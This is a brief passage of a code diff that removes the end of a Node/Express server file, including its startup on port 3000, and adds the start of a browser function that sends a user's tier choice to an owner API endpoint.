-        res.json({ ok: true });
-    } catch { res.json({ ok: false }); }
-});
-
-// START SERVER
-const PORT = process.env.PORT || 3000;
-
-app.listen(PORT, "0.0.0.0", () => {
-    console.log(`Server running on port ${PORT}`);
-});
+async function setTier(username) {
+    const tier = document.getElementById("tier-sel-" + username).value;
+    const res  = await fetch("/api/owner/set-tier", {
